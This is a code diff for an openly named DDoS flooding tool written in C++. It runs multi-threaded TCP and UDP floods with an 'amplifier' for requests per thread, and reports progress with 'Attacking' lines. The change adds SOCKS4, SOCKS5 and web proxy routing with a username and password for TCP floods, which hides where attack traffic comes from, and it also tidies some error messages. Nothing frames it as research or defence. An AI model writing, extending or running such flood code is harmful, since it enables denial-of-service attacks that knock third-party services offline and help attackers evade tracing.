@@ -5,6 +5,7 @@
 #include <sys/stat.h>
 #include <cstring>
 #include <csignal>
+#include <iostream>
 
 #define MAX_BUFFER 2048ul
 
@@ -12,17 +13,26 @@
              COLOR_RESET " -T " COLOR_BLUE "<threads>" COLOR_RESET " -a " COLOR_BLUE "<amplifier>" COLOR_RESET " " COLOR_CYAN "[OPTIONS]" COLOR_RESET\
              "\n" COLOR_RESET COLOR_YELLOW                                                                                                  \
              "Options:\n"                                                                                                                   \
-             " --method|-m    <method>    ddos method\n"                                                                                    \
-             " --target|-t    <target>    target address\n"                                                                                 \
-             " --threads|-T   <threads>   threads count\n"                                                                                  \
-             " --amplifier|-a <amplifier> in-thread requests count\n"                                                                       \
-             " --data|-d      <file>      send data from file\n"                                                                            \
-             " --debug|-D                 toggle debug printing\n"                                                                          \
-             " --proxy|-p     <proxy>     proxy address (not working)" COLOR_RESET "\n"
+             " --method|-m        <method>    ddos method\n"                                                                                \
+             " --target|-t        <target>    target address\n"                                                                             \
+             " --threads|-T       <threads>   threads count\n"                                                                              \
+             " --amplifier|-a     <amplifier> in-thread requests count\n"                                                                   \
+             " --data|-d          <file>      send data from file\n"                                                                        \
+             " --debug|-D                     toggle debug printing\n"                                                                      \
+             " --proxy|-p         <proxy>     proxy address\n"                                                                              \
+             " --sockver|-s       <version>   proxy version:\n"                                                                             \
+             "                                 - DIRECT\n"                                                                                  \
+             "                                 - SOCKS4\n"                                                                                  \
+             "                                 - SOCKS5\n"                                                                                  \
+             "                                 - WEB\n"                                                                                     \
+             " --proxyuser|-U     <user>      proxy username\n"                                                                             \
+             " --proxypassword|-P <password>  password of proxy user" COLOR_RESET "\n"
 
 #define REPORT_FMT COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA \
         "%s" COLOR_RESET " | sent " COLOR_GREEN "%d" COLOR_RESET " | failed " COLOR_RED "%d" COLOR_RESET " | running threads %d\n"
 
+#define HUGE_BUFFER_FMT COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't allocate buffer of size = %lu. Maximum size is %lu." COLOR_RESET
+#define COULDNT_OPEN_FILE_FMT COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't open file \"%s\" : %s - %s" COLOR_RESET
 
 static const char* appname;
 static const char* send_data = nullptr;
@@ -32,19 +42,26 @@ static int failed_requests = 0;
 static size_t amplifier = 0;
 static std::string method;
 static bool debug = false;
+static std::string target_address_str;
 static net::inet_address* target_address = nullptr;
 static net::inet_address* proxy_address = nullptr;
+static int proxy_type = PROXYSOCKET_TYPE_NONE;
+static const char* proxy_user = "";
+static const char* proxy_password = "";
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
-static constexpr const char* s_options = "m:t:T:a:d:Dp:";
+static constexpr const char* s_options = "m:t:T:a:d:Dp:s:";
 const option l_options[]{
-		{"method",    required_argument, nullptr, 'm'},
-		{"target",    required_argument, nullptr, 't'},
-		{"threads",   required_argument, nullptr, 'T'},
-		{"amplifier", required_argument, nullptr, 'a'},
-		{"data",      required_argument, nullptr, 'd'},
-		{"debug",     no_argument,       nullptr, 'D'},
-		{"proxy",     required_argument, nullptr, 'p'},
+		{"method",        required_argument, nullptr, 'm'},
+		{"target",        required_argument, nullptr, 't'},
+		{"threads",       required_argument, nullptr, 'T'},
+		{"amplifier",     required_argument, nullptr, 'a'},
+		{"data",          required_argument, nullptr, 'd'},
+		{"debug",         no_argument,       nullptr, 'D'},
+		{"proxy",         required_argument, nullptr, 'p'},
+		{"sockver",       required_argument, nullptr, 's'},
+		{"proxyuser",     required_argument, nullptr, 'U'},
+		{"proxypassword", required_argument, nullptr, 'P'},
 		{nullptr}
 };
 
@@ -64,7 +81,7 @@ void* flood_thread(void*)
 	::srandom(::time(nullptr));
 	for (size_t i = 0; i < amplifier; ++i)
 	{
-		if (method == "UDP" || method == "udp")
+		if ((method == "UDP" || method == "udp") && !proxy_address)
 		{
 			method = "UDP";
 			net::udp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), proxy_address, debug);
@@ -78,7 +95,10 @@ void* flood_thread(void*)
 		else // tcp
 		{
 			method = "TCP";
-			net::tcp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), proxy_address, debug);
+			net::tcp_flood flood(
+					*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))),
+					proxy_address, proxy_type, proxy_user, proxy_password, debug
+			);
 			::pthread_mutex_lock(&mutex);
 			if (flood)
 				++sent_requests;
@@ -117,7 +137,7 @@ int main(int argc, char** argv)
 			{
 				auto addr_str = std::string(optarg);
 				for (char& i: addr_str) i = std::tolower(i);
-				target_address = new net::inet_address(addr_str);
+				target_address_str = addr_str;;
 				break;
 			}
 			
@@ -153,12 +173,37 @@ int main(int argc, char** argv)
 				break;
 			}
 			
+			case 's':
+			{
+				auto sockver_str = std::string(optarg);
+				for (char& i: sockver_str) i = std::toupper(i);
+				proxy_type = proxysocketconfig_get_name_type(sockver_str.c_str());
+				break;
+			}
+			
+			case 'U':
+			{
+				proxy_user = ::strdup(optarg);
+				break;
+			}
+			
+			case 'P':
+			{
+				proxy_password = ::strdup(optarg);
+				break;
+			}
+			
 			default: // '?'
 			{
 				::printf(HELP, appname);
 				::exit(0);
 			}
 		}
+	}
+	
+	if (!target_address_str.empty())
+	{
+		target_address = new net::inet_address(target_address_str, proxy_address);
 	}
 	
 	if (debug)
@@ -184,21 +229,13 @@ int main(int argc, char** argv)
 				}
 				else
 				{
-					::fprintf(
-							stderr,
-							COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't allocate buffer of size = %lu. Maximum size is %lu." COLOR_RESET,
-							st.st_size, MAX_BUFFER
-					);
+					::fprintf(stderr, HUGE_BUFFER_FMT, st.st_size, MAX_BUFFER);
 					::exit(-1);
 				}
 			}
 			else
 			{
-				::fprintf(
-						stderr,
-						COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't open file \"%s\" : %s - %s" COLOR_RESET,
-						data_file.c_str(), ::strerrorname_np(errno), ::strerrordesc_np(errno)
-				);
+				::fprintf(stderr, COULDNT_OPEN_FILE_FMT, data_file.c_str(), ::strerrorname_np(errno), ::strerrordesc_np(errno));
 				::exit(errno);
 			}
 		}
